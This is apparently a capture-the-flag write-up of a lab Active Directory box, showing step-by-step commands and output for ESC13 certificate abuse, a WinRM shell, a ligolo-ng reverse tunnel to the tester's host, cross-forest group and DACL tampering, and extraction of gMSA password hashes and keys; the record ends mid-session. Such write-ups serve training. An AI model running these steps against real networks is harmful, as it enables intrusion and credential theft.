# Machine info
As is common in real life pentests, you will start the PingPong box with credentials for the following account c.roberts / AssumedBreach123

```python
c.roberts:AssumedBreach123
```

# Host file setup
```python
❯❯❯ sudo nxc smb 10.129.245.56 --generate-hosts-file /etc/hosts    

SMB         10.129.245.56   445    dc1              [*]  x64 (name:dc1) (domain:ping.htb) (signing:True) (SMBv1:None) (NTLM:False)
```

Since NTLM is disabled ill also generate a realm 

# System time
```python
❯❯❯ ntpdate dc1.ping.htb  
2026-11-22 02:29:19.158508 (+0000) +28799.610798 +/- 0.006356 dc1.ping.htb 10.129.245.56 s1 no-leap
CLOCK: step_systime: Operation not permitted
```

Its running at +8h

# Enumeration
## Open ports
```python
❯❯❯ nmap -p- --min-rate=2000 -sT -Pn dc1.ping.htb -vv

Nmap scan report for dc1.ping.htb (10.129.245.56)
Host is up, received user-set (0.012s latency).
Scanned at 2026-11-21 18:30:13 GMT for 65s
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
2179/tcp  open  vmrdp            syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
49664/tcp open  unknown          syn-ack
49670/tcp open  unknown          syn-ack
51795/tcp open  unknown          syn-ack
64770/tcp open  unknown          syn-ack
64920/tcp open  unknown          syn-ack
64924/tcp open  unknown          syn-ack

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 65.69 seconds
```

## Nmap
```python
❯❯❯ nmap -p 53,88,135,139,389,445,464,593,636,2179,3268,3269,5985,9389 -A --min-rate=2000 -sT -Pn dc1.ping.htb
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-21 18:33 +0000
Nmap scan report for dc1.ping.htb (10.129.245.56)
Host is up (0.013s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-22 02:33:10Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ping.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc1.ping.htb, DNS:ping.htb, DNS:PING
| Not valid before: 2026-04-20T18:54:50
|_Not valid after:  2106-04-20T18:54:50
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ping.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc1.ping.htb, DNS:ping.htb, DNS:PING
| Not valid before: 2026-04-20T18:54:50
|_Not valid after:  2106-04-20T18:54:50
|_ssl-date: TLS randomness does not represent time
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: ping.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc1.ping.htb, DNS:ping.htb, DNS:PING
| Not valid before: 2026-04-20T18:54:50
|_Not valid after:  2106-04-20T18:54:50
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ping.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc1.ping.htb, DNS:ping.htb, DNS:PING
| Not valid before: 2026-04-20T18:54:50
|_Not valid after:  2106-04-20T18:54:50
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows
```

2179 kinda tells me there is going to be some form of virtualisation, most likely an internal network

# SMB (445)

```python
❯❯❯ faketime -f +8h nxc smb dc1.ping.htb -u 'c.roberts' -p 'AssumedBreach123' -k
SMB         dc1.ping.htb    445    dc1              [*]  x64 (name:dc1) (domain:ping.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc1.ping.htb    445    dc1              [+] ping.htb\c.roberts:AssumedBreach123
```

The creds work on the domain!

```python
❯❯❯ faketime -f +8h nxc smb dc1.ping.htb -u 'c.roberts' -p 'AssumedBreach123' -k --users
SMB         dc1.ping.htb    445    dc1              [*]  x64 (name:dc1) (domain:ping.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc1.ping.htb    445    dc1              [+] ping.htb\c.roberts:AssumedBreach123 
SMB         dc1.ping.htb    445    dc1              -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         dc1.ping.htb    445    dc1              Administrator                 2026-02-03 09:42:36 0       Built-in account for administering the computer/domain 
SMB         dc1.ping.htb    445    dc1              Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         dc1.ping.htb    445    dc1              krbtgt                        2025-06-16 11:36:47 0       Key Distribution Center Service Account 
SMB         dc1.ping.htb    445    dc1              M.Russell                     2025-12-28 08:14:51 0       IT manager 
SMB         dc1.ping.htb    445    dc1              G.Lorents                     2025-12-28 08:14:51 0       IT Support Specialist 
SMB         dc1.ping.htb    445    dc1              Z.Iskam                       2025-12-28 08:14:51 0       IT Director 
SMB         dc1.ping.htb    445    dc1              M.Wallace                     2025-12-28 08:14:51 0       Assurance Tester 
SMB         dc1.ping.htb    445    dc1              P.Paul                        2025-12-28 08:14:52 0       Security Specialist 
SMB         dc1.ping.htb    445    dc1              A.Gordon                      2025-12-28 08:14:52 0       Network Engineer 
SMB         dc1.ping.htb    445    dc1              P.Klain                       2025-12-28 08:14:52 0       Senior IT Technician 
SMB         dc1.ping.htb    445    dc1              C.Roberts                     2025-12-28 08:14:52 0       Junior IT Technician 
SMB         dc1.ping.htb    445    dc1              S.Zhoski                      2026-01-17 14:42:20 0        
SMB         dc1.ping.htb    445    dc1              R.Miller                      2026-01-17 14:42:20 0        
SMB         dc1.ping.htb    445    dc1              A.Adam                        2026-01-17 14:42:20 0        
SMB         dc1.ping.htb    445    dc1              R.Robins                      2026-01-17 14:42:20 0        
SMB         dc1.ping.htb    445    dc1              P.Pollek                      2026-01-17 14:42:20 0        
SMB         dc1.ping.htb    445    dc1              O.Plinski                     2026-01-17 14:42:20 0        
SMB         dc1.ping.htb    445    dc1              V.Vodomir                     2026-01-17 14:42:21 0        
SMB         dc1.ping.htb    445    dc1              D.MacKenzie                   2026-01-17 14:42:21 0        
SMB         dc1.ping.htb    445    dc1              P.Vandeval                    2026-01-17 14:42:21 0        
SMB         dc1.ping.htb    445    dc1              T.Yang                        2026-01-17 14:42:21 0        
SMB         dc1.ping.htb    445    dc1              N.Neri                        2026-01-17 14:42:21 0        
SMB         dc1.ping.htb    445    dc1              W.Williams                    2026-01-17 14:42:21 0        
SMB         dc1.ping.htb    445    dc1              K.Podroski                    2026-01-17 14:42:21 0        
SMB         dc1.ping.htb    445    dc1              G.James                       2026-01-17 14:42:21 0        
SMB         dc1.ping.htb    445    dc1              [*] Enumerated 25 local users: PING
```

Ill get the users and the user account descriptions

```python
❯❯❯ faketime -f +8h nxc smb dc1.ping.htb -u 'c.roberts' -p 'AssumedBreach123' -k --rid-brute 20000 | grep SidTypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
Administrator
Guest
krbtgt
DC1$
pong$
M.Russell
G.Lorents
Z.Iskam
M.Wallace
P.Paul
A.Gordon
P.Klain
C.Roberts
gMSA$
S.Zhoski
R.Miller
A.Adam
R.Robins
P.Pollek
O.Plinski
V.Vodomir
D.MacKenzie
P.Vandeval
T.Yang
N.Neri
W.Williams
K.Podroski
G.James
```

Ill use the rid brute flag since this also pulls machine accounts to get a user file

I also only have read on default shares

# Bloodhound collection

```python
❯❯❯ bloodyAD --host dc1.ping.htb -d ping.htb -k get bloodhound --transitive                  
Clock skew detected. Adjusting local time by 7:59:58.951478. Retrying operation.
[+] Connecting to LDAP server
Clock skew detected. Adjusting local time by 7:59:58.812825. Retrying operation.
[+] Connected to LDAP serrver
Dumping schema: 2it [00:00, 26.81it/s]
Generating lookuptable: 105it [00:00, 548.40it/s]
Dumping SDs:  99%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████▍ | 110/111 [00:01<00:00, 61.98it/s]
Dumping domains: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00, 21.15it/s]
Dumping users: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 25/25 [00:00<00:00, 650.14it/s]
Dumping computers: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 2/2 [00:00<00:00, 93.06it/s]
Dumping groups: 100%|█████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 53/53 [00:00<00:00, 1183.26it/s]
Dumping GPOs: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 3/3 [00:00<00:00, 168.87it/s]
Dumping OUs: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00, 66.65it/s]
Dumping Containers: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 19/19 [00:00<00:00, 353.97it/s]
[+] Bloodhound data saved to 20261121T184834_Bloodhound.zip
[+] Found 1 trusts
[+] Found trust pong.htb (S-1-5-21-2410575906-3092493790-2123333151)
[+] Connecting to pong.htb (follow_trusts)
[-] Failed to connect to pong.htb ([Errno -2] Name or service not known)
[-] If it's a connectivity issue (not auth issue), make sure the hostname resolves to an IP address (eg. modify your /etc/hosts)
```

From this output i can see bloodyAD detects a trust, but since the machine is likely internal i cannot reach it as of yet

![](Pasted%20image%2020261121190039.png)

And after ingesting this i see there is a trust between the two domains

# ADCS (ESC13) leads to access over WINRM

```python
❯❯❯ faketime -f +8h certipy-ad find -dc-ip 10.129.245.56 -dc-host dc1.ping.htb -target dc1.ping.htb -target-ip 10.129.245.56 -u c.roberts -p 'AssumedBreach123' -k -enabled -stdout -vulnerable

Certificate Authorities
  0
    CA Name                             : ping-DC1-CA
    DNS Name                            : dc1.ping.htb
    Certificate Subject                 : CN=ping-DC1-CA, DC=ping, DC=htb
    Certificate Serial Number           : 6F8E726EEFA64B894CE82D498BC27632
    Certificate Validity Start          : 2026-04-20 18:54:41+00:00
    Certificate Validity End            : 2126-04-20 19:04:41+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Unknown
    Request Disposition                 : Unknown
    Enforce Encryption for Requests     : Unknown
    Active Policy                       : Unknown
    Disabled Extensions                 : Unknown
Certificate Templates
  0
    Template Name                       : TemporaryWinRM
    Display Name                        : Temporary WinRM
    Certificate Authorities             : ping-DC1-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-12-23T17:19:28+00:00
    Template Last Modified              : 2025-12-27T21:12:15+00:00
    Issuance Policies                   : 1.3.6.1.4.1.311.21.8.5808481.4086498.12600997.2067446.8927163.214.489503.1996623
    Linked Groups                       : CN=TempWinRMAccess,CN=Users,DC=ping,DC=htb
    Permissions
      Enrollment Permissions
        Enrollment Rights               : PING.HTB\Domain Admins
                                          PING.HTB\Domain Users
                                          PING.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : PING.HTB\Administrator
        Full Control Principals         : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Write Owner Principals          : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Write Dacl Principals           : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Write Property Enroll           : PING.HTB\Domain Admins
                                          PING.HTB\Domain Users
                                          PING.HTB\Enterprise Admins
    [+] User Enrollable Principals      : PING.HTB\Domain Users
    [!] Vulnerabilities
      ESC13                             : Template allows client authentication and issuance policy is linked to group 'CN=TempWinRMAccess,CN=Users,DC=ping,DC=htb'.
```

Looks like i can grant winrm access through ESC13

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc13-issuance-policy-with-privileged-group-linked

```python
❯❯❯ faketime -f +8h certipy-ad req -dc-ip 10.129.245.56 -dc-host dc1.ping.htb -target dc1.ping.htb -target-ip 10.129.245.56 -u c.roberts -p 'AssumedBreach123' -k -ca 'ping-DC1-CA' -template 'TemporaryWinRM'
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 18
[*] Successfully requested certificate
[*] Got certificate with UPN 'C.Roberts@ping.htb'
[*] Certificate object SID is 'S-1-5-21-750635624-2058721901-1932338391-2617'
[*] Saving certificate and private key to 'c.roberts.pfx'
[*] Wrote certificate and private key to 'c.roberts.pfx'
```

Ill first just make the request specifying the CA and the template

```python
❯❯❯ faketime -f +8h certipy-ad auth -pfx c.roberts.pfx -dc-ip 10.129.245.56
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'C.Roberts@ping.htb'
[*]     Security Extension SID: 'S-1-5-21-750635624-2058721901-1932338391-2617'
[*] Using principal: 'c.roberts@ping.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'c.roberts.ccache'
File 'c.roberts.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'c.roberts.ccache'
[*] Trying to retrieve NT hash for 'c.roberts'
[*] Got hash for 'c.roberts@ping.htb': aad3b435b51404eeaad3b435b51404ee:2475be69d40e815588a85fd89c7a439d
```

Then ill auth with it, i now have a TGT that contains the authentication info to connect over WINRM

```python
❯❯❯ export KRB5CCNAME=c.roberts.ccache

❯❯❯ faketime -f +8h evil-winrm -i dc1.ping.htb -r ping.htb
                                        
Evil-WinRM shell v4.1
                                        
Info: Establishing connection to remote endpoint
                                        
Info: Connection successful
*Evil-WinRM* PS C:\Users\C.Roberts\Documents> 
```

Then after exporting ill just specify the host and the realm, which has already been setup at the start

# Pivoting with ligolo-ng

```python
*Evil-WinRM* PS C:\Users\C.Roberts\Documents> ping pong.htb

Pinging pong.htb [192.168.2.2] with 32 bytes of data:
Reply from 192.168.2.2: bytes=32 time<1ms TTL=128
Reply from 192.168.2.2: bytes=32 time<1ms TTL=128
Reply from 192.168.2.2: bytes=32 time<1ms TTL=128
Reply from 192.168.2.2: bytes=32 time<1ms TTL=128

Ping statistics for 192.168.2.2:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms
*Evil-WinRM* PS C:\Users\C.Roberts\Documents
```

As seen here there is an internal network which is the `pong.htb` domain

```python
evil-winrm-py PS C:\ProgramData> upload agent.exe .
Uploading /home/kali/htb/pingpong/agent.exe: 7.06MB [00:14, 521kB/s]                                                                                                                                                               
[+] File uploaded successfully as: C:\ProgramData\agent.exe
```

First ill upload the agent

```python
❯❯❯ sudo ./proxy -selfcert                                    
[sudo] password for kali: 
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] daemon configuration file not found. Creating a new one... 
? Enable Ligolo-ng WebUI? No
WARN[0001] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
ERRO[0001] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
INFO[0001] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.9.2

ligolo-ng »
```

Then ill start the proxy on my system

```python
evil-winrm-py PS C:\ProgramData> .\agent.exe -connect 10.10.14.61:11601 --retry --ignore-cert
```

Ill then send the connection back to my machine

```python
ligolo-ng » INFO[0207] Agent joined.                                 id=00155d168601 name="PING\\C.Roberts@dc1" remote="10.129.245.56:55877"
ligolo-ng » 
ligolo-ng » 
ligolo-ng » session
? Specify a session : 1 - PING\C.Roberts@dc1 - 10.129.245.56:55877 - 00155d168601
[Agent : PING\C.Roberts@dc1] » 

[Agent : PING\C.Roberts@dc1] » ifcreate --name ligolo
INFO[0221] Creating a new ligolo interface...           
INFO[0221] Interface created!

[Agent : PING\C.Roberts@dc1] » route_add --name ligolo --route 192.168.2.0/24
INFO[0259] Route created.                               
[Agent : PING\C.Roberts@dc1] » start
INFO[0263] Starting tunnel to PING\C.Roberts@dc1 (00155d168601) 
[Agent : PING\C.Roberts@dc1] » 
```

So first ill select the session then add an interface for this connection, then ill add the routing info found earlier and then start the tunnel

```python
❯❯❯ nxc smb 192.168.2.0/24                                                 
SMB         192.168.2.1     445    dc1              [*]  x64 (name:dc1) (domain:ping.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         192.168.2.2     445    DC2              [*]  x64 (name:DC2) (domain:pong.htb) (signing:True) (SMBv1:None) (NTLM:False)
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

As seen here there is two hosts, two domain controllers

DC1 is the only i can reach from my machine, so my focus for now will be on `.2.2`

Another things to note, looks like NTLM is disabled in both domains

```python
❯❯❯ sudo nxc smb 192.168.2.2 --generate-hosts-file /etc/hosts
[sudo] password for kali: 
SMB         192.168.2.2     445    DC2              [*]  x64 (name:DC2) (domain:pong.htb) (signing:True) (SMBv1:None) (NTLM:False)
```

Ill also create an entry in my hosts file for dc2

# Trust enumeration

```python
❯❯❯ faketime -f +8h nxc ldap dc2.pong.htb -u c.roberts -p 'AssumedBreach123' -k -d ping.htb --dc-list     
LDAP        dc2.pong.htb    389    DC2              [*] None (name:DC2) (domain:ping.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        dc2.pong.htb    389    DC2              [+] ping.htb\c.roberts:AssumedBreach123 
LDAP        dc2.pong.htb    389    DC2              DC2.pong.htb = 192.168.2.2
LDAP        dc2.pong.htb    389    DC2              [+] Found DC in trusted domain: dc1.ping.htb
LDAP        dc2.pong.htb    389    DC2              ping.htb -> Bidirectional -> Forest Transitive
LDAP        dc2.pong.htb    389    DC2              dc1.ping.htb = 192.168.2.1
```

I can use nxc to get the details on the trust, this is clearly a two way trust

```python
❯❯❯ cat /etc/krb5.conf
[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = PING.HTB
    dns_canonicalize_hostname = false
    rdns = false

[realms]
    PING.HTB = {
        kdc = dc1.ping.htb
        admin_server = dc1.ping.htb
        default_domain = ping.htb
    }
    PONG.HTB = {
        kdc = dc2.pong.htb
        admin_server = dc2.pong.htb
    }

[domain_realm]
    .ping.htb = PING.HTB
    ping.htb = PING.HTB
    .pong.htb = PONG.HTB
    pong.htb = PONG.HTB
```

In order to auth, ill update the `krb5.conf` for both domains

```python
❯❯❯ faketime -f +8h nxc ldap dc2.pong.htb -u c.roberts -p 'AssumedBreach123' -k -d ping.htb --gmsa
LDAP        dc2.pong.htb    389    DC2              [*] None (name:DC2) (domain:ping.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        dc2.pong.htb    389    DC2              [+] ping.htb\c.roberts:AssumedBreach123 
LDAP        dc2.pong.htb    389    DC2              [*] Getting GMSA Passwords
LDAP        dc2.pong.htb    389    DC2              Account: Pong_gMSA$           NTLM: <no read permissions>                PrincipalsAllowedToReadPassword: gMSA Managers
```

After seeing an interesting user with a user profile on dc1 `Pong_gMSA$` it gave me the idea to check gmsa and i see this group has the permission to read this

```python
❯❯❯ faketime -f +8h nxc ldap dc2.pong.htb -u c.roberts -p 'AssumedBreach123' -k -d ping.htb --groups
LDAP        dc2.pong.htb    389    DC2              [*] None (name:DC2) (domain:ping.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        dc2.pong.htb    389    DC2              [+] ping.htb\c.roberts:AssumedBreach123 
LDAP        dc2.pong.htb    389    DC2              -Group-                                  -Members- -Description-

...[SNIP]...

LDAP        dc2.pong.htb    389    DC2              gMSA Managers                            0 
```

Looks like there is no members in this group currently

# Writable objects in `pong.htb` as `c.roberts`

```python
❯❯❯ export KRB5CCNAME=c.roberts.ccache

❯❯❯ faketime -f +8h getST.py -k -no-pass -dc-ip 192.168.2.1 'ping.htb/c.roberts' -spn 'krbtgt/PONG.HTB'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting ST for user
[*] Saving ticket in c.roberts@krbtgt_PONG.HTB@PING.HTB.ccache

❯❯❯ export KRB5CCNAME=c.roberts@krbtgt_PONG.HTB@PING.HTB.ccache

❯❯❯ faketime -f +8h getST.py -k -no-pass -dc-ip 192.168.2.2 'pong.htb/c.roberts' -spn 'ldap/dc2.pong.htb'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting ST for user
[*] Saving ticket in c.roberts@ldap_dc2.pong.htb@PONG.HTB.ccache
```

Now i have setup a ticket i can auth to the other domain with

```python
❯❯❯ faketime -f +8h bloodyAD --host dc2.pong.htb -d ping.htb -k ccache=c.roberts@ldap_dc2.pong.htb@PONG.HTB.ccache get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=pong,DC=htb
permission: WRITE

distinguishedName: CN=gMSA Managers,CN=Users,DC=pong,DC=htb
DACL: WRITE

distinguishedName: DC=pong.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=pong,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.pong.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=pong,DC=htb
permission: CREATE_CHILD
```

I can now check writable objects as this user `c.roberts`

And as seen here i see that i have WriteDACL on this, which means i can give `c.roberts` genericAll then add them to the group in order to read the gmsa password of `Pong_gMSA$`

# Adding `c.roberts` to `gMSA Managers`

```python
❯❯❯ faketime -f +8h bloodyAD --host dc2.pong.htb -d pong.htb -k ccache=c.roberts@ldap_dc2.pong.htb@PONG.HTB.ccache add genericAll 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' 'S-1-5-21-750635624-2058721901-1932338391-2617'
[+] S-1-5-21-750635624-2058721901-1932338391-2617 has now GenericAll on CN=gMSA Managers,CN=Users,DC=pong,DC=htb
```

Ill get the SID of `c.roberts` from bloodhound then add genericAll

```python
❯❯❯ faketime -f +8h bloodyAD --host dc2.pong.htb -d pong.htb -k ccache=c.roberts@ldap_dc2.pong.htb@PONG.HTB.ccache add groupMember 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' 'S-1-5-21-750635624-2058721901-1932338391-2617'

...[SNIP]...

badldap.commons.exceptions.LDAPModifyException: unwillingToPerform for CN=gMSA Managers,CN=Users,DC=pong,DC=htb (Attr) — Reason:(ERROR_DS_GLOBAL_CANT_HAVE_CROSSDOMAIN_MEMBER) A global group cannot have a cross-domain member.
```

I cannot add this member to this group because of the configuration of the `gMSA Managers` group, it is set with a different group type

```python
❯❯❯ faketime -f +8h bloodyAD --host dc2.pong.htb -d pong.htb -k ccache=c.roberts@ldap_dc2.pong.htb@PONG.HTB.ccache get object 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb'

...[SNIP]...

groupType: -2147483646
```

This means i was right, this group type means the group itself is set to a global type, this group type can only contain users and groups from the same domain, but theres another twist:

- Global → Universal (allowed only if the group isn't currently a member of another global-scope group)
- Universal → Domain Local (always allowed, no membership restriction)
- Domain Local → Universal (allowed only if it has no domain-local group as a member)
- Universal → Global (allowed only if it contains no other universal groups)

In order to add a user from another forest to this group i need the domain local group type

But i cant directly change this into a domain local group type, i need to first make it into a universal group then a domain local group

![](Pasted%20image%2020261123191548.png)

![](Pasted%20image%2020261123191558.png)

The above is the outline of how the group types work

> Key takeaway for trust abuse: only Domain Local groups can hold members from outside the forest (foreign security principals). Global groups are domain-bound; Universal groups are forest-bound but not beyond. If you have write access to a Global group and need to add a cross-trust/cross-forest principal, you have to flip it Global → Universal → Domain Local in two separate writes — there's no shortcut.

```python
❯❯❯ faketime -f +8h bloodyAD --host dc2.pong.htb -d pong.htb -k ccache=c.roberts@ldap_dc2.pong.htb@PONG.HTB.ccache set object 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' groupType -v '-2147483640'
[+] CN=gMSA Managers,CN=Users,DC=pong,DC=htb's groupType has been updated
```

First ill make it into a universal group type

```python
❯❯❯ faketime -f +8h bloodyAD --host dc2.pong.htb -d pong.htb -k ccache=c.roberts@ldap_dc2.pong.htb@PONG.HTB.ccache set object 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' groupType -v '-2147483644'
[+] CN=gMSA Managers,CN=Users,DC=pong,DC=htb's groupType has been updated
```

Now its domain local, and i should be able to add him to the group

```python
❯❯❯ faketime -f +8h bloodyAD --host dc2.pong.htb -d pong.htb -k ccache=c.roberts@ldap_dc2.pong.htb@PONG.HTB.ccache add groupMember 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' 'S-1-5-21-750635624-2058721901-1932338391-2617'
[+] S-1-5-21-750635624-2058721901-1932338391-2617 added to CN=gMSA Managers,CN=Users,DC=pong,DC=htb
```

Now the user is part of the group!

# Compromising `Pong_gMSA$`

The current TGT i have for `c.roberts` does not reflect the group change, so ill need to get a new one

```python
❯❯❯ faketime -f +8h getTGT.py ping.htb/'c.roberts':'AssumedBreach123'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in c.roberts.ccache

❯❯❯ export KRB5CCNAME=c.roberts.ccache
```

Now i have a new TGT, ill make sure to export it

```python
❯❯❯ faketime -f +8h nxc ldap dc2.pong.htb --use-kcache --gmsa           
LDAP        dc2.pong.htb    389    DC2              [*] None (name:DC2) (domain:PING.HTB) (signing:Unknown) (channel binding:No TLS cert) (NTLM:False)
LDAP        dc2.pong.htb    389    DC2              [+] PING.HTB\c.roberts from ccache 
LDAP        dc2.pong.htb    389    DC2              [*] Getting GMSA Passwords
LDAP        dc2.pong.htb    389    DC2              Account: Pong_gMSA$           NTLM: 989bd748ac8dd0b71ab24edccc9fc012     PrincipalsAllowedToReadPassword: gMSA Managers
LDAP        dc2.pong.htb    389    DC2              Account: Pong_gMSA$           aes128-cts-hmac-sha1-96: 97cefa17dcaec66d9b52a97be398acf0
LDAP        dc2.pong.htb    389    DC2              Account: Pong_gMSA$           aes256-cts-hmac-sha1-96: 725f29ca3b45942c57a4e8576532f0262c55edfdce59bdcd4b411f4566ea1aa6
```

I can now use these AES keys to make a ticket as this user

```python
faketime -f +8h nxc smb dc2.pong.htb -u 'pong_gmsa$' --aesKey '725f29ca3b45942c57a4e8576532f0262c55edfdce59bdcd4b411f4566ea1aa6' -k --generate-tgt pong_gmsa
SMB         dc2.pong.htb    445    dc2              [*]  x64 (name:dc2) (domain:pong.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         dc2.pong.htb    445    dc2              [+] pong.htb\pong_gmsa$:725f29ca3b45942c57a4e8576532f0262c55edfdce59bdcd4b411f4566ea1aa6 
SMB         dc2.pong.htb    445    dc2              [+] TGT saved to: pong_gmsa.ccache
SMB         dc2.pong.htb    445    dc2              [+] Run the following command to use the TGT: export KRB5CCNAME=pong_gmsa.ccache
```

I can then use the AES key to get a TGT

```python
❯❯❯ faketime -f +8h python3 venv/bin/evil-winrm-py -i dc1.ping.htb -k --no-pass -c restricted
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.7.0

